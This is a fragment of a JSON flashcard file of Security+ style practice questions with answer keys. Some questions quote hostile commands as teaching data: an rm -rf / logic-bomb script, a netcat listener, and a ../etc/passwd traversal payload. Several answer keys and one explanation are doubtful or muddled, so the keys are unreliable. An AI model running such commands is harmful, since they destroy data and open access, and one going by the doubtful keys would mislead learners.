+      "front": "Which of the following threat actors is MOST likely to steal a company's proprietary information to gain a market edge and reduce time to market?\nA. Competitor\nB. Hacktivist\nC. Insider\nD. Organized crime",
+      "back": "A. Competitor"
+    },
+    {
+      "front": "Which of the following BEST describes an important security advantage yielded by implementing vendor diversity?\nA. Sustainability\nB. Homogeneity\nC. Resiliency\nD. Configurability",
+      "back": "C. Resiliency"
+    },
+    {
+      "front": "Which of the following specifically describes the exploitation of an interactive process to access otherwise restricted areas of the OS?\nA. Pivoting\nB. Process affinity\nC. Buffer overflow\nD. XSS",
+      "back": "C. Buffer overflow"
+    },
+    {
+      "front": "Which of the following differentiates a collision attack from a rainbow table attack?\nA. A rainbow table attack performs a hash lookup.\nB. A rainbow table attack uses the hash as a password.\nC. In a collision attack, the hash and the input data are equivalent.\nD. In a collision attack, the same input results in different hashes.",
+      "back": "A. A rainbow table attack performs a hash lookup."
+    },
+    {
+      "front": "A security analyst observes the following events in the logs of an employee workstation: 1/23 1:07:16 865 Access to C:\\Users\\user\\temp\\oasdfkh.hta has been restricted by your administrator by the default restriction policy level. 1/23 1:07:09 1034 The scan is completed. No detections were found. The security analyst reviews the file system and observes the following: C:\\>dir C:\\Users\\user\\temp 1/23 1:07:02 oasdfkh.hta 1/23 1:07:02 update.bat 1/23 1:07:02 msg.txt Given the information provided, which of the following MOST likely occurred on the workstation?\nA. Application whitelisting controls blocked an exploit payload from executing.\nB. Antivirus software found and quarantined three malware files.\nC. Automatic updates were initiated but failed because they had not been approved.\nD. The SIEM log aged was not tuned properly and reported a false positive.",
+      "back": "A. Application whitelisting controls blocked an exploit payload from executing."
+    },
+    {
+      "front": "A security technician has been receiving alerts from several servers that indicate load balancers have had a significant increase in traffic. The technician initiates a system scan. The scan results illustrate that the disk space on several servers has reached capacity. The scan also indicates that incoming internet traffic to the servers has increased. Which of the following is the MOST likely cause of the decreased disk space?\nA. Misconfigured devices\nB. Logs and events anomalies\nC. Authentication issues\nD. Unauthorized software",
+      "back": "D. Unauthorized software"
+    },
+    {
+      "front": "A security administrator is diagnosing a server where the CPU utilization is at 100% for 24 hours. The main culprit of CPU utilization is the antivirus program. Which of the following issue could occur if left unresolved? (Select TWO)\nA. MITM attack\nB. DoS attack\nC. DLL injection\nD. Buffer overflow\nE. Resource exhaustion",
+      "back": "B. DoS attack\nE. Resource exhaustion"
+    },
+    {
+      "front": "Which of the following is used to validate the integrity of data?\nA. CBC\nB. Blowfish\nC. MD5\nD. RSA",
+      "back": "C. MD5"
+    },
+    {
+      "front": "A user typically works remotely over the holidays using a web-based VPN to access corporate resources. The user reports getting untrusted host errors and being unable to connect. Which of the following is MOST likely the case?\nA. The certificate has expired\nB. The browser does not support SSL\nC. The user's account is locked out\nD. The VPN software has reached the seat license maximum",
+      "back": "A. The certificate has expired"
+    },
+    {
+      "front": "When it comes to cloud computing, if one of the requirements for a project is to have the most control over the systems in the cloud, which of the following is a service model that would be BEST suited for this goal?\nA. Infrastructure\nB. Platform\nC. Software\nD. Virtualization",
+      "back": "A. Infrastructure"
+    },
+    {
+      "front": "A company was recently audited by a third party. The audit revealed the company's network devices were transferring files in the clear. Which of the following protocols should the company use to transfer files?\nA. HTTPS\nB. LDAPS\nC. SCP\nD. SNMPv3",
+      "back": "C. SCP"
+    },
+    {
+      "front": "A security analyst is acquiring data from a potential network incident. Which of the following evidence is the analyst MOST likely to obtain to determine the incident?\nA. Volatile memory capture\nB. Traffic and logs\nC. Screenshots\nD. System image capture",
+      "back": "B. Traffic and logs"
+    },
+    {
+      "front": "A cybersecurity analyst is looking into the payload of a random packet capture file that was selected for analysis. The analyst notices that an internal host had a socket established with another internal host over a non-standard port. Upon investigation, the origin host that initiated the socket shows this output: usera@host>history mkdir /local/usr/bin/somedirectory nc -1 192.168.5.1 -p 9856 ping -c 30 8.8.8.8 -a 600 rm /etc/dir2/somefile rm -rm /etc/dir2/ traceroute 8.8.8.8 pakill pid 9487 usera@host> Given the above output, which of the following commands would have established the questionable socket?\nA. traceroute 8.8.8.8\nB. ping -1 30 8.8.8.8 -a 600\nC. nc -1 192.168.5.1 -p 9856\nD. pskill pid 9487",
+      "back": "C. nc -1 192.168.5.1 -p 9856"
+    },
+    {
+      "front": "A security administrator has written a script that will automatically upload binary and text-based configuration files onto a remote server using a scheduled task. The configuration files contain sensitive information. Which of the following should the administrator use? (Select TWO)\nA. TOPT\nB. SCP\nC. FTP over a non-standard pot\nD. SRTP\nE. Certificate-based authentication\nF. SNMPv3",
+      "back": "B. SCP\nE. Certificate-based authentication"
+    },
+    {
+      "front": "A security analyst conducts a manual scan on a known hardened host that identifies many non-compliant items. Which of the following BEST describe why this has occurred? (Select TWO)\nA. Privileged-user certificated were used to scan the host\nB. Non-applicable plug ins were selected in the scan policy\nC. The incorrect audit file was used\nD. The output of the report contains false positives\nE. The target host has been compromised",
+      "back": "B. Non-applicable plug ins were selected in the scan policy\nD. The output of the report contains false positives"
+    },
+    {
+      "front": "Which of the following solutions should an administrator use to reduce the risk from an unknown vulnerability in a third-party software application?\nA. Sandboxing\nB. Encryption\nC. Code signing\nD. Fuzzing",
+      "back": "A. Sandboxing"
+    },
+    {
+      "front": "A network administrator needs to allocate a new network for the R&D group. The network must not be accessible from the Internet regardless of the network firewall or other external misconfigurations. Which of the following settings should the network administrator implement to accomplish this?\nA. Configure the OS default TTL to 1\nB. Use NAT on the R&D network\nC. Implement a router ACL\nD. Enable protected ports on the switch",
+      "back": "A. Configure the OS default TTL to 1"
+    },
+    {
+      "front": "To help prevent one job role from having sufficient access to create, modify, and approve payroll data, which of the following practices should be employed?\nA. Least privilege\nB. Job rotation\nC. Background checks\nD. Separation of duties",
+      "back": "D. Separation of duties"
+    },
+    {
+      "front": "When attackers use a compromised host as a platform for launching attacks deeper into a company's network, it is said that they are:\nA. escalating privilege\nB. becoming persistent\nC. fingerprinting\nD. pivoting",
+      "back": "D. pivoting"
+    },
+    {
+      "front": "The help desk received a call after hours from an employee who was attempting to log into the payroll server remotely. When the help desk returned the call the next morning, the employee was able to log into the server remotely without incident. However, the incident occurred again the next evening. Which of the following BEST describes the cause of the issue?\nA. The password expired on the account and needed to be reset\nB. The employee does not have the rights needed to access the database remotely\nC. Time-of-day restrictions prevented the account from logging in\nD. The employee's account was locked out and needed to be unlocked",
+      "back": "C. Time-of-day restrictions prevented the account from logging in"
+    },
+    {
+      "front": "An analyst receives an alert from the SIEM showing an IP address that does not belong to the assigned network can be seen sending packets to the wrong gateway. Which of the following network devices is misconfigured and which of the following should be done to remediate the issue?\nA. Firewall; implement an ACL on the interface\nB. Router; place the correct subnet on the interface\nC. Switch; modify the access port to trunk port\nD. Proxy; add the correct transparent interface",
+      "back": "B. Router; place the correct subnet on the interface"
+    },
+    {
+      "front": "A home invasion occurred recently in which an intruder compromised a home network and accessed a WiFI- enabled baby monitor while the baby's parents were sleeping. Which of the following BEST describes how the intruder accessed the monitor?\nA. Outdated antivirus\nB. WiFi signal strength\nC. Social engineering\nD. Default configuration",
+      "back": "D. Default configuration"
+    },
+    {
+      "front": "A security engineer must install the same x.509 certificate on three different servers. The client application that connects to the server performs a check to ensure the certificate matches the host name. Which of the following should the security engineer use?\nA. Wildcard certificate\nB. Extended validation certificate\nC. Certificate chaining\nD. Certificate utilizing the SAN file",
+      "back": "D. Certificate utilizing the SAN file\n\nSAN = Subject Alternate Names"
+    },
+    {
+      "front": "Which of the following refers to the term used to restore a system to its operational state?\nA. MTBF\nB. MTTR\nC. RTO\nD. RPO",
+      "back": "B. MTTR"
+    },
+    {
+      "front": "A Chief Information Officer (CIO) recently saw on the news that a significant security flaws exists with a specific version of a technology the company uses to support many critical application. The CIO wants to know if this reported vulnerability exists in the organization and, if so, to what extent the company could be harmed. Which of the following would BEST provide the needed information?\nA. Penetration test\nB. Vulnerability scan\nC. Active reconnaissance\nD. Patching assessment report",
+      "back": "A. Penetration test"
+    },
+    {
+      "front": "An organization is expanding its network team. Currently, it has local accounts on all network devices, but with growth, it wants to move to centrally managed authentication. Which of the following are the BEST solutions for the organization? (Sect TWO)\nA. TACACS+\nB. CHAP\nC. LDAP\nD. RADIUS\nE. MSCHAPv2",
+      "back": "A. TACACS+\nD. RADIUS"
+    },
+    {
+      "front": "An active/passive configuration has an impact on:\nA. confidentiality\nB. integrity\nC. availability\nD. non-repudiation",
+      "back": "C. availability"
+    },
+    {
+      "front": "Which of the following attack types BEST describes a client-side attack that is used to manipulate an HTML iframe with JavaScript code via a web browser?\nA. Buffer overflow\nB. MITM\nC. XSS\nD. SQLi",
+      "back": "C. XSS"
+    },
+    {
+      "front": "Which of the following would provide additional security by adding another factor to a smart card?\nA. Token\nB. Proximity badge\nC. Physical key\nD. PIN",
+      "back": "D. PIN"
+    },
+    {
+      "front": "A security analyst receives an alert from a WAF with the following payload: var data = \"<test test test> ++ <../../../../../../etc/passwd>\" Which of the following types of attacks is this?\nA. Cross-site request forgery\nB. Buffer overflow\nC. SQL injection\nD. JavaScript data insertion\nE. Firewall evasion script",
+      "back": "D. JavaScript data insertion"
+    },
+    {
+      "front": "Which of the following uses precomputed hashes to guess passwords?\nA. Iptables\nB. NAT tables\nC. Rainbow tables\nD. ARP tables",
+      "back": "C. Rainbow tables"
+    },
+    {
+      "front": "A systems administrator wants to provide balance between the security of a wireless network and usability. The administrator is concerned with wireless encryption compatibility of older devices used by some employees. Which of the following would provide strong security backward compatibility when accessing the wireless network?\nA. Open wireless network and SSL VPN\nB. WPA using a preshared key\nC. WAP2 using a RADIUS back-end for 802.1x authentication\nD. WEP with a 40-bit key",
+      "back": "A. Open wireless network and SSL VPN"
+    },
+    {
+      "front": "In determining when it may be necessary to perform a credentialed scan against a system instead of a non- credentialed scan, which of the following requirements is MOST likely to influence its decisions?\nA. The scanner must be able to enumerate the host OS of devices scanner\nB. The scanner must be able to footprint the network\nC. The scanner must be able to check for open ports with listening services\nD. The scanner must be able to audit file system permissions",
+      "back": "D. The scanner must be able to audit file system permissions"
+    },
+    {
+      "front": "A security administrator receives an alert from a third-party vendor that indicates a certificate that was installed in the browser has been hijacked at the root of a small public CA. The security administrator knows there are at least four different browsers in use on more than a thousand computers in the domain worldwide. Which of the following solutions would be BEST for the security administrator to implement to most efficiently assist with this issue?\nA. SSL\nB. CRL\nC. PKI\nD. ACL",
+      "back": "B. CRL"
+    },
+    {
+      "front": "After a user reports slow computer performance, a systems administrator detects a suspicious file, which was installed as part of a freeware software package. The systems administrator reviews the output below: c:\\Windows\\system32>netstat -nab Active Connections Pronto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0 RpcSs [svchoat.exe] TCP 0.0.0.0:445 0.0.0.0 [svchost.exe] TCP 192.168.1.10:5000 10.37.213.20 winserver.exe UDP 192.168.1.10:1900 *.* SSDPSVR Based on the above information, which of the following types of malware was installed on the user's computer?\nA. RAT\nB. Keylogger\nC. Spyware\nD. Worm\nE. Bot",
+      "back": "A. RAT"
+    },
+    {
+      "front": "A company has noticed multiple instances of proprietary information on public websites. It has also observed an increase in the number of email messages sent to random employees containing malicious links and PDFs. Which of the following changes should the company make to reduce the risks associated with phishing attacks? (Select TWO)\nA. Install an additional firewall\nB. Implement a redundant email server\nC. Block access to personal email on corporate systems\nD. Update the X.509 certificates on the corporate email server\nE. Update corporate policy to prohibit access to social media websites\nF. Review access violation on the file server",
+      "back": "C. Block access to personal email on corporate systems\nE. Update corporate policy to prohibit access to social media websites"
+    },
+    {
+      "front": "A security analyst is investigating a potential reach. Upon gathering, documenting, and securing the evidence, which of the following actions is the NEXT step to minimize the business impact?\nA. Launch an investigation to identify the attacking host\nB. Initiate the incident response plan\nC. Review lessons learned captured in the process\nD. Remove malware and restore the system to normal operation",
+      "back": "D. Remove malware and restore the system to normal operation"
+    },
+    {
+      "front": "Joe, a salesman, was assigned to a new project that requires him to travel to a client site. While waiting for a flight, Joe, decides to connect to the airport wireless network without connecting to a VPN,and the sends confidential emails to fellow colleagues. A few days later, the company experiences a data breach. Upon investigation, the company learns Joe's emails were intercepted. Which of the following MOST likely caused the data breach?\nA. Policy violation\nB. Social engineering\nC. Insider threat\nD. Zero-day attack",
+      "back": "A. Policy violation"
+    },
+    {
+      "front": "An information security specialist is reviewing the following output from a Linux server: user@server:~$ -l 5 * * * * /usr/local/bin.backup.sh user@server:~$ cat /usr/local/bin/backup.sh #!/bin/bash if ! grep --quiet joeuser /etc/passwd the rm -rf / fi Based on the above information, which of the following types of malware was installed on the server?\nA. Logic bomb\nB. Trojan\nC. Backdoor\nD. Ransomware\nE. Rootkit",
+      "back": "A. Logic bomb"
+    },
+    {
+      "front": "A company wants to ensure confidential data from storage media is sanitized in such a way that the drive cannot be reused. Which of the following method should the technician use?\nA. Shredding\nB. Wiping\nC. Low-level formatting\nD. Repartitioning\nE. Overwriting",
+      "back": "A. Shredding"
+    },
+    {
+      "front": "A forensic expert is given a hard drive from a crime scene and is asked to perform an investigation. Which of the following is the FIRST step the forensic expert needs to take the chain of custody?\nA. Make a forensic copy\nB. Create a hash of the hard rive\nC. Recover the hard drive data\nD. Update the evidence log",
+      "back": "D. Update the evidence log"
+    },
+    {
+      "front": "An incident response manager has started to gather all the facts related to a SIEM alert showing multiple systems may have been compromised. The manager has gathered these facts: The breach is currently indicated on six user PCs One service account is potentially compromised Executive management has been notified In which of the following phases of the IRP is the manager currently working?\nA. Recovery\nB. Eradication\nC. Containment\nD. Identification",
+      "back": "D. Identification"
+    },
+    {
+      "front": "A stock trading company had the budget for enhancing its secondary datacenter approved. Since the main site is a hurricane-affected area and the disaster recovery site is 100 mi (161 km) away, the company wants to ensure its business is always operational with the least amount of man hours needed. Which of the following types of disaster recovery sites should the company implement?\nA. Hot site\nB. Warm site\nC. Cold site\nD. Cloud-based site",
+      "back": "D. Cloud-based site"
+    },
+    {
+      "front": "A systems administrator is attempting to recover from a catastrophic failure in the datacenter. To recover the domain controller, the systems administrator needs to provide the domain administrator credentials. Which of the following account types is the system administrator using?\nA. Shared accounts\nB. Guest account\nC. Service account\nD. User account",
+      "back": "D. User account"
+    },
+    {
+      "front": "User from two organizations, each with its own PKI, need to begin working together on a joint project. Which of the following would allow the users of the separate PKIs to work together without connection errors?\nA. Trust model\nB. Stapling\nC. Intermediate CA\nD. Key escrow",
+      "back": "A. Trust model"
+    },
+    {
+      "front": "A security analyst is migrating a pass-the-hash vulnerability on a Windows infrastructure. Given the requirement, which of the following should the security analyst do to MINIMIZE the risk?\nA. Enable CHAP\nB. Disable NTLM\nC. Enable Kerebos\nD. Disable PAP",
+      "back": "B. Disable NTLM"
+    },
+    {
+      "front": "An organization requires users to provide their fingerprints to access an application. To improve security, the application developers intend to implement multifactor authentication. Which of the following should be implemented?\nA. Use a camera for facial recognition\nB. Have users sign their name naturally\nC. Require a palm geometry scan\nD. Implement iris recognition",
+      "back": "B. Have users sign their name naturally"
+    },
+    {
+      "front": "A security analyst is reviewing an assessment report that includes software versions, running services, supported encryption algorithms, and permission settings. Which of the following produced the report?\nA. Vulnerability scanner\nB. Protocol analyzer\nC. Network mapper\nD. Web inspector",
+      "back": "A. Vulnerability scanner"
+    },
+    {
+      "front": "A Chief Information Officer (CIO) asks the company's security specialist if the company should spend any funds on malware protection for a specific server. Based on a risk assessment, the ARO value of a malware infection for a server is 5 and the annual cost for the malware protection is $2500. Which of the following SLE values warrants a recommendation against purchasing the malware protection?\nA. $500\nB. $1000\nC. $2000\nD. $2500",
+      "back": "A. $500"
+    },
+    {
+      "front": "The computer resource center issue smartphones to all first-level and above managers. The managers have the ability to install mobile tools. Which of the following tools should be implemented with the type of tools the managers installed?\nA. Download manager\nB. Content manager\nC. Segmentation manager\nD. Application manager",
+      "back": "D. Application manager"
+    },
+    {
+      "front": "A systems administrator wants to provide for and enforce wireless access accountability during events where external speakers are invited to make presentations to a mixed audience of employees and non-employees. Which of the following should the administrator implement?\nA. Shared accounts\nB. Preshared passwords\nC. Least privilege\nD. Sponsored guest",
+      "back": "D. Sponsored guest"
+    },
+    {
+      "front": "A recent internal audit is forcing a company to review each internal business unit's VMs because the cluster they are installed on is in danger of running out of computer resources. Which of the following vulnerabilities exist?\nA. Buffer overflow\nB. End-of-life systems\nC. System sprawl\nD. Weak configuration",
+      "back": "C. System sprawl"
+    },
+    {
+      "front": "A security administrator has found a hash in the environment known to belong to malware. The administrator then finds this file to be in the preupdate area of the OS, which indicated it was pushed from the central patch system. File: winx86_adobe_upgrade.exe Hash: 99ac28bede43ab869b853ba62c4ea243 Administrator pulls a report from the patch management system with the following output: Install Date Package Name Target Device Hash 10/10/2017 java_11.2_x64.exe HQ PC's 01ab28bbde63aa879b35bba62cdea282 10/10/2017 winx86_adobe_flash_upgrade.exe HQ PC's 99ac28bede43ab86b853ba62c4ea243 Given the above output, which of the following MOST likely happened?\nA. The file was corrupted after it left the patch system\nB. The file was infected when the patch manager downloaded it\nC. The file was not approved in the application whitelist system\nD. The file was embedded with a logic bomb to evade detection",
+      "back": "B. The file was infected when the patch manager downloaded it"
+    },
+    {
+      "front": "Two users must encrypt and transmit large amounts of data between them. Which of the following should they use to encrypt and transmit the data?\nA. Symmetric algorithm\nB. Hash function\nC. Digital signature\nD. Obfuscation",
+      "back": "A. Symmetric algorithm"
+    },
+    {
+      "front": "A new Chief Information Officer (CIO) has been reviewing the badging and decides to write a policy that all employees must have their badges rekeyed at least annually. Which of the following controls BEST describes this policy?\nA. Physical\nB. Corrective\nC. Technical\nD. Administrative",
+      "back": "D. Administrative"
+    },
+    {
+      "front": "A software developer is concerned about DLL hijacking in an application being written. Which of the following is the MOST viable mitigation measure of this type of attack?\nA. The DLL of each application should be set individually\nB. All calls to different DLLs should be hard-coded in the application\nC. Access to DLLs from the Windows registry should be disabled\nD. The affected DLLs should be renamed to avoid future hijacking",
+      "back": "B. All calls to different DLLs should be hard-coded in the application"
+    },
+    {
+      "front": "A security engineer wants to implement a site-to-site VPN that will require SSL certificates for mutual authentication. Which of the following should the engineer implement if the design requires client MAC addresses to be visible across the tunnel?\nA. Tunnel mode IPSec\nB. Transport mode VPN IPSec\nC. L2TP\nD. SSL VPN",
+      "back": "D. SSL VPN"
+    },
+    {
+      "front": "An application was recently compromised after some malformed data came in via web form. Which of the following would MOST likely have prevented this?\nA. Input validation\nB. Proxy server\nC. Stress testing\nD. Encoding",
+      "back": "A. Input validation"
+    },
+    {
+      "front": "While working on an incident, Joe, a technician, finished restoring the OS and applications on a workstation from the original media. Joe is about to begin copying the user's files back onto the hard drive. Which of the following incident response steps is Joe working on now?\nA. Recovery\nB. Eradication\nC. Containment\nD. Identification",
+      "back": "A. Recovery"
+    },
+    {
+      "front": "A systems administrator found a suspicious file in the root of the file system. The file contains URLs, usernames, passwords, and text from other documents being edited on the system. Which of the following types of malware would generate such a file?\nA. Keylogger\nB. Rootkit\nC. Bot\nD. RAT",
+      "back": "A. Keylogger"
+    },
+    {
+      "front": "A computer emergency response team is called at midnight to investigate a case in which a mail server was restarted. After an initial investigation, it was discovered that email is being exfiltrated through an active connection. Which of the following is the NEXT step the team should take?\nA. Identify the source of the active connection\nB. Perform eradication of active connection and recover\nC. Performance containment procedure by disconnecting the server\nD. Format the server and restore its initial configuration",
+      "back": "A. Identify the source of the active connection"
+    },
+    {
+      "front": "A remote intruder wants to take inventory of a network so exploits can be researched. The intruder is looking for information about software versions on the network. Which of the following techniques is the intruder using?\nA. Banner grabbing\nB. Port scanning\nC. Packet sniffing\nD. Virus scanning",
+      "back": "A. Banner grabbing"
+    },
+    {
+      "front": "An analyst is reviewing a simple program for potential security vulnerabilities before being deployed to a Windows server. Given the following code: void foo (char *bar) { car random_user_input[12]; stropy (random_user_input, bar); } Which of the following vulnerabilities is present?\nA. Bad memory pointer\nB. Buffer overflow\nC. Integer overflow\nD. Backdoor",
+      "back": "B. Buffer overflow"
+    },
+    {
+      "front": "A company has a data classification system with definitions for \"Private\" and \"Public\". the company's security policy outlines how data should be protected based on type. The company recently added data type \"Proprietary\". Which of the following is the MOST likely reason the company added this data type?\nA. Reduced cost\nB. More searchable data\nC. Better data classification\nD. Expanded authority of the privacy officer",
+      "back": "C. Better data classification"
+    },
+    {
+      "front": "A security technician is configuring an access management system to track and record user actions. Which of the following functions should the technician configure?\nA. Accounting\nB. Authorization\nC. Authentication\nD. Identification",
+      "back": "A. Accounting"
+    },
+    {
+      "front": "A security administrator installed a new network scanner that identifies new host systems on the network. Which of the following did the security administrator install?\nA. Vulnerability scanner\nB. Network-based IDS\nC. Rogue system detection\nD. Configuration compliance scanner",
+      "back": "C. Rogue system detection"
+    },
+    {
+      "front": "A Chief Information Officer (CIO) has decided it is not cost effective to implement safeguards against a known vulnerability. Which of the following risk responses does this BEST describe?\nA. Transference\nB. Avoidance\nC. Mitigation\nD. Acceptance",
+      "back": "D. Acceptance"
+    },
+    {
+      "front": "An audit takes place after company-wide restructuring, in which several employees changed roles. The following deficiencies are found during the audit regarding access to confidential data. Employee Job Function Audit Finding Ann Sales Manager *Access to confidential payroll shares *Access to payroll processing program *Access to marketing shares Jeff Marketing Director *Access to human resources annual review folder *Access to shared human resources mailbox John Sales Manager *Active account *Access to human resources annual review folder *Access to confidential payroll shares Which of the following would be the BEST method to prevent similar audit finding in the future?\nA. Implement separation of duties for the payroll department\nB. Implement a DLP solution on the payroll and human resources reviews\nC. Implement rule-based access controls on the human resources server\nD. Implement regular permission auditing and reviews",
+      "back": "D. Implement regular permission auditing and reviews"
+    },
+    {
+      "front": "A technician is investigating a potentially compromised device with the following symptoms: Browser slowness Frequent browser crashes Hourglass stuck New search toolbar Increased memory consumption Which of the following types of malware has infected the system?\nA. Man-in-the-browser\nB. Spoofer\nC. Spyware\nD. Adware",
+      "back": "D. Adware"
+    },
+    {
+      "front": "A penetration tester has written an application that performs a bit-by-bit XOR 0xFF operation on binaries prior to transmission over untrusted media. Which of the following BEST describes the action performed by this type of application?\nA. Hashing\nB. Key exchange\nC. Encryption\nD. Obfusication",
+      "back": "D. Obfusication"
+    },
+    {
+      "front": "An audit reported has identifies a weakness that could allow unauthorized personnel access to the facility at its main entrance and from there gain access to the network. Which of the following would BEST resolve the vulnerability?\nA. Faraday cage\nB. Air gap\nC. Mantrap\nD. Bollards",
+      "back": "C. Mantrap"
+    },
+    {
+      "front": "When attempting to secure a mobile workstation, which of the following authentication technologies rely on the user's physical characteristics? (Select TWO)\nA. MAC address table\nB. Retina scan\nC. Fingerprint scan\nD. Two-factor authentication\nE. CAPTCHA\nF. Password string",
+      "back": "B. Retina scan\nC. Fingerprint scan"
+    },
+    {
+      "front": "Systems administrator and key support staff come together to simulate a hypothetical interruption of service. The team updates the disaster recovery processes and documentation after meeting. Which of the following describes the team's efforts?\nA. Business impact analysis\nB. Continuity of operation\nC. Tabletop exercise\nD. Order of restoration",
+      "back": "C. Tabletop exercise"
+    },
+    {
+      "front": "A company has two wireless networks utilizing captive portals. Some employees report getting a trust error in their browsers when connecting to one of the networks. Both captive portals are using the same server certificate for authentication, but the analyst notices the following differences between the two certificate details: Certificate 1 Certificate Path: Geotrust Global CA *company.com Certificate 2 Certificate Path: *company.com Which of the following would resolve the problem?\nA. Use a wildcard certificate.\nB. Use certificate chaining.\nC. Use a trust model.\nD. Use an extended validation certificate.",
+      "back": "B. Use certificate chaining."
+    },
+    {
+      "front": "Company A has acquired Company B. Company A has different domains spread globally, and typically migrates its acquisitions infrastructure under its own domain infrastructure. Company B, however, cannot be merged into Company A's domain infrastructure. Which of the following methods would allow the two companies to access one another's resources?\nA. Attestation\nB. Federation\nC. Single sign-on\nD. Kerberos",
+      "back": "B. Federation"
+    },
+    {
+      "front": "A technician is configuring a load balancer for the application team to accelerate the network performance of their applications. The applications are hosted on multiple servers and must be redundant. Given this scenario, which of the following would be the BEST method of configuring the load balancer?\nA. Round-robin\nB. Weighted\nC. Least connection\nD. Locality-based",
+      "back": "D. Locality-based"
+    },
+    {
+      "front": "Ann is the IS manager for several new systems in which the classifications of the systems' data are being decided. She is trying to determine the sensitivity level of the data being processed. Which of the following people should she consult to determine the data classification?\nA. Steward\nB. Custodian\nC. User\nD. Owner",
+      "back": "D. Owner"
+    },
+    {
+      "front": "An organization's employees currently use three different sets of credentials to access multiple internal resources. Management wants to make this process less complex. Which of the following would be the BEST option to meet this goal?\nA. Transitive trust\nB. Single sign-on\nC. Federation\nD. Secure token",
+      "back": "B. Single sign-on"
+    },
+    {
+      "front": "An external attacker can modify the ARP cache of an internal computer. Which of the following types of attacks is described?\nA. Replay\nB. Spoofing\nC. DNS poisoning\nD. Client-side attack",
+      "back": "B. Spoofing"
+    },
+    {
+      "front": "A systems administrator has isolated an infected system from the network and terminated the malicious process from executing. Which of the following should the administrator do NEXT according to the incident response process?\nA. Restore lost data from a backup.\nB. Wipe the system.\nC. Document the lessons learned.\nD. Determine the scope of impact.",
+      "back": "A. Restore lost data from a backup."
+    },
+    {
+      "front": "A new security administrator ran a vulnerability scanner for the first time and caused a system outage. Which of the following types of scans MOST likely caused the outage?\nA. Non-intrusive credentialed scan\nB. Non-intrusive non-credentialed scan\nC. Intrusive credentialed scan\nD. Intrusive non-credentialed scan",
+      "back": "D. Intrusive non-credentialed scan"
+    },
+    {
+      "front": "A security analyst is hardening a WiFi infrastructure. The primary requirements are the following: The infrastructure must allow staff to authenticate using the most secure method. The infrastructure must allow guests to use an \"open\" WiFi network that logs valid email addresses before granting access to the Internet. Given these requirements, which of the following statements BEST represents what the analyst should recommend and configure?\nA. Configure a captive portal for guests and WPS for staff.\nB. Configure a captive portal for staff and WPA for guests.\nC. Configure a captive portal for staff and WEP for guests.\nD. Configure a captive portal for guest and WPA2 Enterprise for staff.",
+      "back": "D. Configure a captive portal for guest and WPA2 Enterprise for staff."
+    },
+    {
+      "front": "A security administrator is trying to eradicate a worm, which is spreading throughout the organization, using an old remote vulnerability in the SMB protocol. The worm uses Nmap to identify target hosts within the company. The administrator wants to implement a solution that will eradicate the current worm and any future attacks that may be using zero-day vulnerabilities. Which of the following would BEST meet the requirements when implemented?\nA. Host-based firewall\nB. Enterprise patch management system\nC. Network-based intrusion prevention system\nD. Application blacklisting\nE. File integrity checking",
+      "back": "C. Network-based intrusion prevention system"
+    },
+    {
+      "front": "Which of the following is a deployment concept that can be used to ensure only the required OS access is exposed to software applications?\nA. Staging environment\nB. Sandboxing\nC. Secure baseline\nD. Trusted OS",
+      "back": "B. Sandboxing"
+    },
+    {
+      "front": "A procedure differs from a policy in that it:\nA. is a high-level statement regarding the company's position on a topic.\nB. sets a minimum expected baseline of behavior.\nC. provides step-by-step instructions for performing a task.\nD. describes adverse actions when violations occur.",
+      "back": "C. provides step-by-step instructions for performing a task."
+    },
+    {
+      "front": "Ann, a user, reports she is unable to access an application from her desktop. A security analyst verifies Ann's access and checks the SIEM for any errors. The security analyst reviews the log file from Ann's system and notices the following output: 2017--08-21 10:48:12 DROP TCP 172.20.89.232 239.255.255.255 443 1900 250 -------- RECEIVE 2017--08-21 10:48:12 DROP UDP 192.168.72.205 239.255.255.255 443 1900 250 -------- RECEIVE Which of the following is MOST likely preventing Ann from accessing the application from the desktop?\nA. Web application firewall\nB. DLP\nC. Host-based firewall\nD. UTM\nE. Network-based firewall",
+      "back": "C. Host-based firewall\n\nWebmail is being blocked. The 250 response code is for SMTP."
+    },
+    {
+      "front": "Which of the following types of penetration test will allow the tester to have access only to password hashes prior to the penetration test?\nA. Black box\nB. Gray box\nC. Credentialed\nD. White box",
+      "back": "B. Gray box"
+    },
+    {
+      "front": "Which of the following threats has sufficient knowledge to cause the MOST danger to an organization?\nA. Competitors\nB. Insiders\nC. Hacktivists\nD. Script kiddies",
+      "back": "B. Insiders"
+    },
+    {
+      "front": "While troubleshooting a client application connecting to the network, the security administrator notices the following error: Certificate is not valid. Which of the following is the BEST way to check if the digital certificate is valid?\nA. PKI\nB. CRL\nC. CSR\nD. IPSec",
+      "back": "B. CRL"
+    },
+    {
+      "front": "To determine the ALE of a particular risk, which of the following must be calculated? (Select TWO).\nA. ARO\nB. ROI\nC. RPO\nD. SLE\nE. RTO",
+      "back": "A. ARO\nD. SLE"
+    },
+    {
+      "front": "A business sector is highly competitive, and safeguarding trade secrets and critical information is paramount. On a seasonal basis, an organization employs temporary hires and contractor personnel to accomplish its mission objectives. The temporary and contract personnel require access to network resources only when on the clock. Which of the following account management practices are the BEST ways to manage these accounts?\nA. Employ time-of-day restrictions.\nB. Employ password complexity.\nC. Employ a random key generator strategy.\nD. Employ an account expiration strategy.\nE. Employ a password lockout policy.",
+      "back": "D. Employ an account expiration strategy."
+    },
+    {
+      "front": "Which of the following locations contain the MOST volatile data?\nA. SSD\nB. Paging file\nC. RAM\nD. Cache memory",
+      "back": "D. Cache memory"
+    },
+    {
+      "front": "Ann, a customer, is reporting that several important files are missing from her workstation. She recently received communication from an unknown party who is requesting funds to restore the files. Which of the following attacks has occurred?\nA. Ransomware\nB. Keylogger\nC. Buffer overflow\nD. Rootkit",
+      "back": "A. Ransomware"
+    },
+    {
+      "front": "Every morning, a systems administrator monitors failed login attempts on the company's log management server. The administrator notices the DBAdmin account has five failed username and/or password alerts during a ten-minute window. The systems administrator determines the user account is a dummy account used to attract attackers. Which of the following techniques should the systems administrator implement?\nA. Role-based access control\nB. Honeypot\nC. Rule-based access control\nD. Password cracker",
+      "back": "B. Honeypot"
+    },
+    {
+      "front": "Joe, a user, has been trying to send Ann, a different user, an encrypted document via email. Ann has not received the attachment but is able to receive the header information. Which of the following is MOST likely preventing Ann from receiving the encrypted file?\nA. Unencrypted credentials\nB. Authentication issues\nC. Weak cipher suite\nD. Permission issues",
+      "back": "B. Authentication issues"
+    },
+    {
